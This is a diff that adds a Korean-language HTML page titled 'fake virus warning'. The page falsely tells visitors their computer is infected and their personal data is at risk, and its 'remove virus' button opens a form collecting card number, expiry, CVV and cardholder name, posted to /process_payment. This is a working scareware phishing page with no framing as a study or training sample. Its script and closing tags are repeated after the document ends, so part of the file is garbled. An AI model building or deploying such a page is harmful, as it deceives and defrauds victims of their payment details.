@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>가짜 바이러스 경고</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+
+        .alert {
+            width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-top: 0;
+        }
+
+        p {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+<div class="alert">
+    <h1>바이러스 경고</h1>
+    <p>당신의 컴퓨터에 바이러스가 감지되었습니다!</p>
+    <p>당신의 개인 정보가 위험에 노출될 수 있으니, 즉시 조치를 취해야 합니다.</p>
+    <button onclick="openPaymentModal()" class="button">바이러스 제거하기</button>
+</div>
+
+<div id="paymentModal" class="modal" style="display: none;">
+    <div class="modal-content">
+        <span class="close" onclick="closePaymentModal()">&times;</span>
+        <h2>결제 정보 입력</h2>
+        <form action="/process_payment" method="POST">
+            <label for="cardNumber">카드 번호:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br><br>
+            <label for="expiry">만료일:</label>
+            <input type="text" id="expiry" name="expiry" required><br><br>
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required><br><br>
+            <label for="name">카드 소유자 이름:</label>
+            <input type="text" id="name" name="name" required><br><br>
+            <input type="submit" value="결제">
+        </form>
+    </div>
+</div>
+
+<script>
+    function openPaymentModal() {
+        document.getElementById("paymentModal").style.display = "block";
+    }
+
+    function closePaymentModal() {
+        document.getElementById("paymentModal").style.display = "none";
+    }
+</script>
+</body>
+</html>
+
+<script>
+    function openPaymentModal() {
+        document.getElementById("paymentModal").style.display = "block";
+    }
+
+    function closePaymentModal() {
+        document.getElementById("paymentModal").style.display = "none";
+    }
+</script>
+</body>
+</html>
+</div>
+</body>
+</html>
